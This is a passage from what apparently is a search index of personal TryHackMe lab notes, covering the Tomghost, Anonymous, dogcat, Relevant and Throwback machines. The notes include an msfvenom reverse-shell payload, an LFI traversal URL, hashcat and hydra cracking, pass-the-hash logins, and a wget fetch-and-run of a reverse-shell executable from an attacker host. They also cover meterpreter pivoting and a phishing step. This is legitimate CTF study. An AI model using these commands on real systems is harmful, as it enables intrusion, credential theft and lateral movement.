kind of late. So far I've scanned, enumerated, and rooted with metasploit. Access and root without metasploit \u00b6 Will be using 39161.py to exploit. searchsploit -m 39161.py Instructions say to run Python3 ./39161.py <ip> ![[8a28e9be040b4ca5bed474df56a30b7e.jpg]]","title":"Steelmountain"},{"location":"TryHackMe/steelmountain/#steelmountain","text":"Started taking notes on this one kind of late. So far I've scanned, enumerated, and rooted with metasploit.","title":"Steelmountain"},{"location":"TryHackMe/steelmountain/#access-and-root-without-metasploit","text":"Will be using 39161.py to exploit. searchsploit -m 39161.py Instructions say to run Python3 ./39161.py <ip> ![[8a28e9be040b4ca5bed474df56a30b7e.jpg]]","title":"Access and root without metasploit"},{"location":"TryHackMe/tomghost/","text":"Tomghost \u00b6 Recon \u00b6 Based on the name it appears to be Apache Tomcat related. The username contains a swear word. Scanning \u00b6 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 53/tcp open tcpwrapped 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) 8080/tcp open http Apache Tomcat 9.0.30 Enumerating external services \u00b6 8080 - Apache Tomcat 9.0.30, default configuration \u00b6 ![[cb107eef217c4d25ba2f329c17839004]] Weaponization \u00b6 This looks promising given the circumstances. ![[10dfa5e248f3439bba1150544d1d0149]] Loot from that exploit ![[66fce28faa1043f5a01f2fba965268ba]] user: skyfuck pass: 8730281lkjlkjdqlksalks Those creds worked for SSH ![[5df9e7ae0e2c4e82b92609bd3220a250]] users ![[95c5c24ce16f4928a6e563df06b98df9]] User flag THM{GhostCat_1s_so_cr4sy} ![[147b615eed7d42feab2a814435a76cae]] Upload and run linpeas ![[c34aeb9fcb1845d6a4cce59b28c35361]] Found an SSH private key? ![[08acb0f4a1ae422b81263a5e657455ff]] ![[82cbdc81dcd34819a8653bd738a082d9]] Looks like we need to log in as root using the private key. Port 8005 is only available from the inside. ![[e7cf94e7cca04d3b8289abb5f54235e8]] Not sure what this is ![[3f1ed64670824d8aa4275cbd7ffebd39]] Going to try cracking the passphrase for PGP private key. \u00b6 First send it through gpg2john ![[041666ac7efa49c4a9cff0444ac8b092]] Then use john to crack ![[e7a72984499946b5bb8a44b715abe55a]] Cracked in record time when I switched to rockyou.txt! ![[001f34ebb80b4cd9823f2befcdaca6ae]] file: tryhackme pass: alexandru Import the pgp key \u00b6 ![[968a427301084bd686b8523918aa82ac]] Decrypt the credential \u00b6 ![[2c47147ea5ca456f8db2481192da7253]] Logged in as merlin, I have sudo privs for zip. GTFObins gave me root shell https://gtfobins.github.io/gtfobins/zip/ ![[6aee0a72ac87482b836f2bae68b22254]]","title":"Tomghost"},{"location":"TryHackMe/tomghost/#tomghost","text":"","title":"Tomghost"},{"location":"TryHackMe/tomghost/#recon","text":"Based on the name it appears to be Apache Tomcat related. The username contains a swear word.","title":"Recon"},{"location":"TryHackMe/tomghost/#scanning","text":"PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 53/tcp open tcpwrapped 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) 8080/tcp open http Apache Tomcat 9.0.30","title":"Scanning"},{"location":"TryHackMe/tomghost/#enumerating-external-services","text":"","title":"Enumerating external services"},{"location":"TryHackMe/tomghost/#8080-apache-tomcat-9030-default-configuration","text":"![[cb107eef217c4d25ba2f329c17839004]]","title":"8080 - Apache Tomcat 9.0.30, default configuration"},{"location":"TryHackMe/tomghost/#weaponization","text":"This looks promising given the circumstances. ![[10dfa5e248f3439bba1150544d1d0149]] Loot from that exploit ![[66fce28faa1043f5a01f2fba965268ba]] user: skyfuck pass: 8730281lkjlkjdqlksalks Those creds worked for SSH ![[5df9e7ae0e2c4e82b92609bd3220a250]] users ![[95c5c24ce16f4928a6e563df06b98df9]] User flag THM{GhostCat_1s_so_cr4sy} ![[147b615eed7d42feab2a814435a76cae]] Upload and run linpeas ![[c34aeb9fcb1845d6a4cce59b28c35361]] Found an SSH private key? ![[08acb0f4a1ae422b81263a5e657455ff]] ![[82cbdc81dcd34819a8653bd738a082d9]] Looks like we need to log in as root using the private key. Port 8005 is only available from the inside. ![[e7cf94e7cca04d3b8289abb5f54235e8]] Not sure what this is ![[3f1ed64670824d8aa4275cbd7ffebd39]]","title":"Weaponization"},{"location":"TryHackMe/tomghost/#going-to-try-cracking-the-passphrase-for-pgp-private-key","text":"First send it through gpg2john ![[041666ac7efa49c4a9cff0444ac8b092]] Then use john to crack ![[e7a72984499946b5bb8a44b715abe55a]] Cracked in record time when I switched to rockyou.txt! ![[001f34ebb80b4cd9823f2befcdaca6ae]] file: tryhackme pass: alexandru","title":"Going to try cracking the passphrase for PGP private key."},{"location":"TryHackMe/tomghost/#import-the-pgp-key","text":"![[968a427301084bd686b8523918aa82ac]]","title":"Import the pgp key"},{"location":"TryHackMe/tomghost/#decrypt-the-credential","text":"![[2c47147ea5ca456f8db2481192da7253]] Logged in as merlin, I have sudo privs for zip. GTFObins gave me root shell https://gtfobins.github.io/gtfobins/zip/ ![[6aee0a72ac87482b836f2bae68b22254]]","title":"Decrypt the credential"},{"location":"TryHackMe/Work%20in%20Progress/Anonymous/","text":"Anonymous \u00b6 Port scan showed that FTP was open. I was able to connect with user anonymous and password anonymous . There was a message about Passive mode when logging in, and from past experience I know I need to force active mode to download/upload anyting: ftp <IP> -A It looks like I have write permissions to a script clean.sh which appears to be running on a schedule. I replaced the script with a reverse shell and am waiting with a listener. msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.2.73.217 LPORT=4444 -f sh -o clean.sh","title":"Anonymous"},{"location":"TryHackMe/Work%20in%20Progress/Anonymous/#anonymous","text":"Port scan showed that FTP was open. I was able to connect with user anonymous and password anonymous . There was a message about Passive mode when logging in, and from past experience I know I need to force active mode to download/upload anyting: ftp <IP> -A It looks like I have write permissions to a script clean.sh which appears to be running on a schedule. I replaced the script with a reverse shell and am waiting with a listener. msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.2.73.217 LPORT=4444 -f sh -o clean.sh","title":"Anonymous"},{"location":"TryHackMe/Work%20in%20Progress/BufferOverFlowPrep/","text":"BufferOverFlowPrep \u00b6 This room is a nice practice zone for buffer overflow exploit development. I've already completed the first two tasks which include launching the VM and a buffer overflow leveraging mona in immunity debugger to increase speed. I see a lot of automation potential in the exploit provided in task 2. So I will use this series to come up with a toolset to automate this crap so I never have to do it again. Initially I was going to document my journey as I developed the tool, but it was too much extra work. Here's the code . Only runs on linux and xclip required. It could easily be ported to Windows, just need to change the functions that access clipboard. LMK if you have any questions!","title":"BufferOverFlowPrep"},{"location":"TryHackMe/Work%20in%20Progress/BufferOverFlowPrep/#bufferoverflowprep","text":"This room is a nice practice zone for buffer overflow exploit development. I've already completed the first two tasks which include launching the VM and a buffer overflow leveraging mona in immunity debugger to increase speed. I see a lot of automation potential in the exploit provided in task 2. So I will use this series to come up with a toolset to automate this crap so I never have to do it again. Initially I was going to document my journey as I developed the tool, but it was too much extra work. Here's the code . Only runs on linux and xclip required. It could easily be ported to Windows, just need to change the functions that access clipboard. LMK if you have any questions!","title":"BufferOverFlowPrep"},{"location":"TryHackMe/Work%20in%20Progress/Daily%20Bugle/","text":"","title":"Daily Bugle"},{"location":"TryHackMe/Work%20in%20Progress/Ice/","text":"Ice \u00b6 This box is an introductory Windows box. Services \u00b6 The tryhackme room is a walktrhough. We're focused on port 8000 which has icecast running. Vulnerability \u00b6 CVE-2004-1561 provides code execution through buffer overflow. Recommended to use metasploit. It was pretty simple and mostly worked as is. windows/http/icecast_header is used as the initial foothold. Then we used exploit_suggester to find windows/local/bypassuac_eventvwr . The privesc exploit kept failing so I finally decided to migrate to an x64 system process (explorer.exe) and fire the exploit with x64 as the target. This gave me a successful privesc.","title":"Ice"},{"location":"TryHackMe/Work%20in%20Progress/Ice/#ice","text":"This box is an introductory Windows box.","title":"Ice"},{"location":"TryHackMe/Work%20in%20Progress/Ice/#services","text":"The tryhackme room is a walktrhough. We're focused on port 8000 which has icecast running.","title":"Services"},{"location":"TryHackMe/Work%20in%20Progress/Ice/#vulnerability","text":"CVE-2004-1561 provides code execution through buffer overflow. Recommended to use metasploit. It was pretty simple and mostly worked as is. windows/http/icecast_header is used as the initial foothold. Then we used exploit_suggester to find windows/local/bypassuac_eventvwr . The privesc exploit kept failing so I finally decided to migrate to an x64 system process (explorer.exe) and fire the exploit with x64 as the target. This gave me a successful privesc.","title":"Vulnerability"},{"location":"TryHackMe/Work%20in%20Progress/dogcat/","text":"Dogcat \u00b6 The only open ports on this one are SSH(22) and HTTP(80). Webserver \u00b6 I was checking out the webserver and was able to trigger an error which seems to hint toward LFI vulnerability. My suspicion is based on this URL http://10.10.226.6/?view=dog../../../../etc/passwd Which produced this error on the webpage Warning: include(dog../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24 Warning: include(): Failed opening 'dog../../../../etc/passwd.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24 I tried many methods to read /etc/passwd but was unsuccessful. Next step is to throw an LFI list using something like dirbuster or ZAP","title":"Dogcat"},{"location":"TryHackMe/Work%20in%20Progress/dogcat/#dogcat","text":"The only open ports on this one are SSH(22) and HTTP(80).","title":"Dogcat"},{"location":"TryHackMe/Work%20in%20Progress/dogcat/#webserver","text":"I was checking out the webserver and was able to trigger an error which seems to hint toward LFI vulnerability. My suspicion is based on this URL http://10.10.226.6/?view=dog../../../../etc/passwd Which produced this error on the webpage Warning: include(dog../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24 Warning: include(): Failed opening 'dog../../../../etc/passwd.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24 I tried many methods to read /etc/passwd but was unsuccessful. Next step is to throw an LFI list using something like dirbuster or ZAP","title":"Webserver"},{"location":"TryHackMe/Work%20in%20Progress/relevant/","text":"Relevant \u00b6 Recon \u00b6 Flags: \u00b6 user.txt root.txt Rules: \u00b6 Manual exploitation preferred. Locate/note all vulns found. Submit flags to dashboard. Stay in scope - stick to the room's box. Find and report ALL vulnerabilities. nmap scan \u00b6 \u2514\u2500$ nmap -sV -T5 10.10.89.145 | tee quickscan Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:29 CDT Nmap scan report for 10.10.89.145 Host is up (0.21s latency). Not shown: 995 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 (SSDP/UPnP) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 3389/tcp open ssl/ms-wbt-server? 49663/tcp open http syn-ack ttl 125 Microsoft IIS httpd 10.0 49667/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49669/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 100.75 seconds Service Enumeration \u00b6 For the service enumeration, a more thorough scan was needed. nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN full_tcp_nmap.txt 10.10.89.145 :80 - IIS 10.0 \u00b6 X-Powered-By: ASP.NET :135 - Microsoft Windows RPC \u00b6 Many services exposed via RCP. Provider: appinfo.dll Provider: BFE.DLL Provider: certprop.dll Provider: dhcpcsvc.dll Provider: dhcpcsvc6.dll Provider: gpsvc.dll Provider: iphlpsvc.dll Provider: MPSSVC.dll Provider: msdtcprx.dll Provider: N/A Provider: nrpsrv.dll Provider: nsisvc.dll Provider: pcasvc.dll Provider: samsrv.dll Provider: schedsvc.dll Provider: services.exe Provider: spoolsv.exe Provider: sppsvc.exe Provider: srvsvc.dll Provider: ssdpsrv.dll Provider: sysntfy.dll Provider: taskcomp.dll Provider: wevtsvc.dll Provider: wininit.exe Provider: winlogon.exe UUID : FAF2447B-B348-4FEB-8DBE-BEEE5B7F7778 v1.0 OnlineProviderCert RPC Interface Protocol: [MS-CMPO]: MSDTC Connection Manager: Protocol: [MS-EVEN6]: EventLog Remoting Protocol Protocol: [MS-PAN]: Print System Asynchronous Notification Protocol Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol Protocol: [MS-RPRN]: Print System Remote Protocol Protocol: [MS-RSP]: Remote Shutdown Protocol Protocol: [MS-SAMR]: Security Account Manager (SAM) Remote Protocol Protocol: [MS-SCMR]: Service Control Manager Remote Protocol Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol :139 - Microsoft Windows netbios-ssn \u00b6 nothing worth noting. :445 - Windows Server 2016 Standard Evaluation 14393 microsoft-ds \u00b6 Using smb the Guest can read \\10.10.89.145\\nt4wrksv\\passwords.txt passwords.txt $ smbclient //10.10.67.66/nt4wrksv -U Guest Password is (nothing) copied the files locally get passwords.txt Decode the password $ echo \"Qm9iIC0gIVBAJCRXMHJEITEyMw==\" | base64 --decode Bob - !P@$$W0rD!123 $ echo \"QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk\" | base64 --decode Bill - Juw4nnaM4n420696969!$$$ Username: Bob Password: !P@$$W0rD!123 Username: Bill Password: Juw4nnaM4n420696969!$$$ Wonder what those credentials are for? Check these Vulnerabilities :3389 - Microsoft Terminal Services \u00b6 Rdp, not much about it on there. Credentials didn't work with RDP. :49663 - IIS 10.0 \u00b6 X-Powered-By: ASP.NET page never loads in browser OS Guess: \u00b6 Windows Server 2008 R2 \u00b6 You're my boy Blue! Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3) \u00b6 Microsoft Windows Server 2016 (90%) \u00b6 Weaponization \u00b6","title":"Relevant"},{"location":"TryHackMe/Work%20in%20Progress/relevant/#relevant","text":"","title":"Relevant"},{"location":"TryHackMe/Work%20in%20Progress/relevant/#recon","text":"","title":"Recon"},{"location":"TryHackMe/Work%20in%20Progress/relevant/#flags","text":"user.txt root.txt","title":"Flags:"},{"location":"TryHackMe/Work%20in%20Progress/relevant/#rules","text":"Manual exploitation preferred. Locate/note all vulns found. Submit flags to dashboard. Stay in scope - stick to the room's box. Find and report ALL vulnerabilities.","title":"Rules:"},{"location":"TryHackMe/Work%20in%20Progress/relevant/#nmap-scan","text":"\u2514\u2500$ nmap -sV -T5 10.10.89.145 | tee quickscan Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:29 CDT Nmap scan report for 10.10.89.145 Host is up (0.21s latency). Not shown: 995 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 (SSDP/UPnP) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 3389/tcp open ssl/ms-wbt-server? 49663/tcp open http syn-ack ttl 125 Microsoft IIS httpd 10.0 49667/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49669/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 100.75 seconds","title":"nmap scan"},{"location":"TryHackMe/Work%20in%20Progress/relevant/#service-enumeration","text":"For the service enumeration, a more thorough scan was needed. nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN full_tcp_nmap.txt 10.10.89.145","title":"Service Enumeration"},{"location":"TryHackMe/Work%20in%20Progress/relevant/#80-iis-100","text":"X-Powered-By: ASP.NET","title":":80 - IIS 10.0"},{"location":"TryHackMe/Work%20in%20Progress/relevant/#135-microsoft-windows-rpc","text":"Many services exposed via RCP. Provider: appinfo.dll Provider: BFE.DLL Provider: certprop.dll Provider: dhcpcsvc.dll Provider: dhcpcsvc6.dll Provider: gpsvc.dll Provider: iphlpsvc.dll Provider: MPSSVC.dll Provider: msdtcprx.dll Provider: N/A Provider: nrpsrv.dll Provider: nsisvc.dll Provider: pcasvc.dll Provider: samsrv.dll Provider: schedsvc.dll Provider: services.exe Provider: spoolsv.exe Provider: sppsvc.exe Provider: srvsvc.dll Provider: ssdpsrv.dll Provider: sysntfy.dll Provider: taskcomp.dll Provider: wevtsvc.dll Provider: wininit.exe Provider: winlogon.exe UUID : FAF2447B-B348-4FEB-8DBE-BEEE5B7F7778 v1.0 OnlineProviderCert RPC Interface Protocol: [MS-CMPO]: MSDTC Connection Manager: Protocol: [MS-EVEN6]: EventLog Remoting Protocol Protocol: [MS-PAN]: Print System Asynchronous Notification Protocol Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol Protocol: [MS-RPRN]: Print System Remote Protocol Protocol: [MS-RSP]: Remote Shutdown Protocol Protocol: [MS-SAMR]: Security Account Manager (SAM) Remote Protocol Protocol: [MS-SCMR]: Service Control Manager Remote Protocol Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol","title":":135 - Microsoft Windows RPC"},{"location":"TryHackMe/Work%20in%20Progress/relevant/#139-microsoft-windows-netbios-ssn","text":"nothing worth noting.","title":":139 - Microsoft Windows netbios-ssn"},{"location":"TryHackMe/Work%20in%20Progress/relevant/#445-windows-server-2016-standard-evaluation-14393-microsoft-ds","text":"Using smb the Guest can read \\10.10.89.145\\nt4wrksv\\passwords.txt passwords.txt $ smbclient //10.10.67.66/nt4wrksv -U Guest Password is (nothing) copied the files locally get passwords.txt Decode the password $ echo \"Qm9iIC0gIVBAJCRXMHJEITEyMw==\" | base64 --decode Bob - !P@$$W0rD!123 $ echo \"QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk\" | base64 --decode Bill - Juw4nnaM4n420696969!$$$ Username: Bob Password: !P@$$W0rD!123 Username: Bill Password: Juw4nnaM4n420696969!$$$ Wonder what those credentials are for? Check these Vulnerabilities","title":":445 - Windows Server 2016 Standard Evaluation 14393 microsoft-ds"},{"location":"TryHackMe/Work%20in%20Progress/relevant/#3389-microsoft-terminal-services","text":"Rdp, not much about it on there. Credentials didn't work with RDP.","title":":3389 - Microsoft Terminal Services"},{"location":"TryHackMe/Work%20in%20Progress/relevant/#49663-iis-100","text":"X-Powered-By: ASP.NET page never loads in browser","title":":49663 - IIS  10.0"},{"location":"TryHackMe/Work%20in%20Progress/relevant/#os-guess","text":"","title":"OS Guess:"},{"location":"TryHackMe/Work%20in%20Progress/relevant/#windows-server-2008-r2","text":"You're my boy Blue!","title":"Windows Server 2008 R2"},{"location":"TryHackMe/Work%20in%20Progress/relevant/#windows-server-2016-standard-evaluation-14393-windows-server-2016-standard-evaluation-63","text":"","title":"Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)"},{"location":"TryHackMe/Work%20in%20Progress/relevant/#microsoft-windows-server-2016-90","text":"","title":"Microsoft Windows Server 2016 (90%)"},{"location":"TryHackMe/Work%20in%20Progress/relevant/#weaponization","text":"","title":"Weaponization"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/10.200.70.138%20Throwback-FW01/","text":"Throwback-FW01 \u00b6 Open ports \u00b6 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.5 (protocol 2.0) 53/tcp open domain syn-ack ttl 63 (generic dns response: REFUSED) 80/tcp open http syn-ack ttl 63 nginx 443/tcp open https syn-ack ttl 63 nginx pfsense was running with default credentials admin:pfsense using diagnostics > command prompt we are able to get a reverse shell as root with the pentest money shell at /usr/share/webshells/php/php-reverse-shell.php Network \u00b6 There are 2 interfaces lo0 172.19.0.1 xn0 10.200.70.138 Loot \u00b6 last login in login.log user HumphreyW pass 1c13639dba96c7b53d26f7d00956a364","title":"Throwback-FW01"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/10.200.70.138%20Throwback-FW01/#throwback-fw01","text":"","title":"Throwback-FW01"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/10.200.70.138%20Throwback-FW01/#open-ports","text":"22/tcp open ssh syn-ack ttl 63 OpenSSH 7.5 (protocol 2.0) 53/tcp open domain syn-ack ttl 63 (generic dns response: REFUSED) 80/tcp open http syn-ack ttl 63 nginx 443/tcp open https syn-ack ttl 63 nginx pfsense was running with default credentials admin:pfsense using diagnostics > command prompt we are able to get a reverse shell as root with the pentest money shell at /usr/share/webshells/php/php-reverse-shell.php","title":"Open ports"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/10.200.70.138%20Throwback-FW01/#network","text":"There are 2 interfaces lo0 172.19.0.1 xn0 10.200.70.138","title":"Network"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/10.200.70.138%20Throwback-FW01/#loot","text":"last login in login.log user HumphreyW pass 1c13639dba96c7b53d26f7d00956a364","title":"Loot"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/10.200.70.219%20Throwback-Prod/","text":"Throwback-Prod \u00b6 22/tcp open ssh syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0) 80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 10.0 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? syn-ack ttl 127 3389/tcp open ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services 5357/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 49668/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49669/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49675/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Caught an NTLM hash for the user PetersJ using responder cracked with hashcat hashcat -m 5600 peters-hash /usr/share/wordlists/rockyou.txt -r OneRuleToRuleThemAll.rule --debug-mode=1 - -debug-file=matched.rule Password is Throwback317 able to log in now with ssh PetersJ@throwback.local@10.200.70.219 Saved credentials BlaireJ 7eQgx6YzxgG3vC45t5k9 Elevation \u00b6 runas /savecred /user:admin-petersj /profile \"cmd.exe\" then set up meterpreter session as peterj-admin autorouting and socks proxy (4a) Now log into Throwback-WS01 as BlaireJ proxychains ssh BlaireJ@Throwback.local@10.200.70.222 Then enter the password 7eQgx6YzxgG3vC45t5k9 Setting up the proxy \u00b6 evil-winrm -u admin-petersj -H 74fb0a2ee8a066b1e372475dcbc121c5 -i 10.200.70.219 establish meterpreter python3 -m http.server 444 wget http://10.50.71.63:444/rshell-4444.exe -o shell.exe msfconsole -q -x \"use multi/handler\" set payload windows/x64/meterpreter/reverse_tcp set lhost tun0 set lport 4444 run ./shell.exe run autoroute -s 10.200.70.0/24 bg use auxiliary/server/socks_proxy run Setting up the next hop \u00b6 proxychains evil-winrm -u MercerH -H 5edc955e8167199d1b7d0e656da0ceea -i 10.200.70.117 wget http://10.50.71.63:444/rshell-4445.exe -o shell.exe msfconsole -q -x \"use multi/handler\" set payload windows/x64/meterpreter/reverse_tcp set lhost tun0 set lport 4445 run ./shell.exe bg use post/multi/manage/autoroute set session 1 run use auxiliary/server/socks_proxy run Current objective: run mimikatz on Throwback-DC01 to get MercerH password - Changed it to Throwback2020 Pivoting with SSH tunnel \u00b6 (example attacker - kali pwned jumpbox - debian ) To setup a socks proxy from our kali machine on port 8080 sudo ssh -N -D localhost:8080 <user>@debian Run stuff through the proxy proxychains.conf socks4 localhost 8080 proxychains <command>","title":"Throwback-Prod"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/10.200.70.219%20Throwback-Prod/#throwback-prod","text":"22/tcp open ssh syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0) 80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 10.0 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? syn-ack ttl 127 3389/tcp open ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services 5357/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 49668/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49669/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49675/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Caught an NTLM hash for the user PetersJ using responder cracked with hashcat hashcat -m 5600 peters-hash /usr/share/wordlists/rockyou.txt -r OneRuleToRuleThemAll.rule --debug-mode=1 - -debug-file=matched.rule Password is Throwback317 able to log in now with ssh PetersJ@throwback.local@10.200.70.219 Saved credentials BlaireJ 7eQgx6YzxgG3vC45t5k9","title":"Throwback-Prod"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/10.200.70.219%20Throwback-Prod/#elevation","text":"runas /savecred /user:admin-petersj /profile \"cmd.exe\" then set up meterpreter session as peterj-admin autorouting and socks proxy (4a) Now log into Throwback-WS01 as BlaireJ proxychains ssh BlaireJ@Throwback.local@10.200.70.222 Then enter the password 7eQgx6YzxgG3vC45t5k9","title":"Elevation"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/10.200.70.219%20Throwback-Prod/#setting-up-the-proxy","text":"evil-winrm -u admin-petersj -H 74fb0a2ee8a066b1e372475dcbc121c5 -i 10.200.70.219 establish meterpreter python3 -m http.server 444 wget http://10.50.71.63:444/rshell-4444.exe -o shell.exe msfconsole -q -x \"use multi/handler\" set payload windows/x64/meterpreter/reverse_tcp set lhost tun0 set lport 4444 run ./shell.exe run autoroute -s 10.200.70.0/24 bg use auxiliary/server/socks_proxy run","title":"Setting up the proxy"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/10.200.70.219%20Throwback-Prod/#setting-up-the-next-hop","text":"proxychains evil-winrm -u MercerH -H 5edc955e8167199d1b7d0e656da0ceea -i 10.200.70.117 wget http://10.50.71.63:444/rshell-4445.exe -o shell.exe msfconsole -q -x \"use multi/handler\" set payload windows/x64/meterpreter/reverse_tcp set lhost tun0 set lport 4445 run ./shell.exe bg use post/multi/manage/autoroute set session 1 run use auxiliary/server/socks_proxy run Current objective: run mimikatz on Throwback-DC01 to get MercerH password - Changed it to Throwback2020","title":"Setting up the next hop"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/10.200.70.219%20Throwback-Prod/#pivoting-with-ssh-tunnel","text":"(example attacker - kali pwned jumpbox - debian ) To setup a socks proxy from our kali machine on port 8080 sudo ssh -N -D localhost:8080 <user>@debian Run stuff through the proxy proxychains.conf socks4 localhost 8080 proxychains <command>","title":"Pivoting with SSH tunnel"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/10.200.70.232%20%20Throwback-Mail/","text":"Throwback-Mail \u00b6 Port scan \u00b6 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu)) 143/tcp open imap syn-ack ttl 63 Dovecot imapd (Ubuntu) 993/tcp open ssl/imap syn-ack ttl 63 Dovecot imapd (Ubuntu) On port 80, the webserver is Squirrel mail. Guest account credentials are listed here: The guest account has a list of contacts, which are assumingly users on the domain: Able to get a few of the passwords by attacking the mail server's login page: We even did a phishing campaign (using reverse shell executable) and one of the users fell for it which gave us an administrator reverse shell.","title":"Throwback-Mail"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/10.200.70.232%20%20Throwback-Mail/#throwback-mail","text":"","title":"Throwback-Mail"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/10.200.70.232%20%20Throwback-Mail/#port-scan","text":"22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu)) 143/tcp open imap syn-ack ttl 63 Dovecot imapd (Ubuntu) 993/tcp open ssl/imap syn-ack ttl 63 Dovecot imapd (Ubuntu) On port 80, the webserver is Squirrel mail. Guest account credentials are listed here: The guest account has a list of contacts, which are assumingly users on the domain: Able to get a few of the passwords by attacking the mail server's login page: We even did a phishing campaign (using reverse shell executable) and one of the users fell for it which gave us an administrator reverse shell.","title":"Port scan"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/10.200.70.250/","text":"","title":"10.200.70.250"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/10.41.0.2/","text":"","title":"10.41.0.2"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/Loot/","text":"hydra cracked these from the guest contact list. [80][http-post-form] host: 10.200.70.232 login: PeanutbutterM password: Summer2020 [VERBOSE] Page redirected to http://10.200.70.232/src/webmail.php [80][http-post-form] host: 10.200.70.232 login: DaviesJ password: Management2018 [VERBOSE] Page redirected to http://10.200.70.232/src/webmail.php [80][http-post-form] host: 10.200.70.232 login: GongoH password: Summer2020 [VERBOSE] Page redirected to http://10.200.70.232/src/webmail.php [VERBOSE] Page redirected to http://10.200.70.232/src/webmail.php [80][http-post-form] host: 10.200.70.232 login: JeffersD password: Summer2020 [80][http-post-form] host: 10.200.70.232 login: MurphyF password: Summer2020 responder hashes [SMB] NTLMv2-SSP Client : ::ffff:10.200.70.219 [SMB] NTLMv2-SSP Username : THROWBACK\\PetersJ [SMB] NTLMv2-SSP Hash : 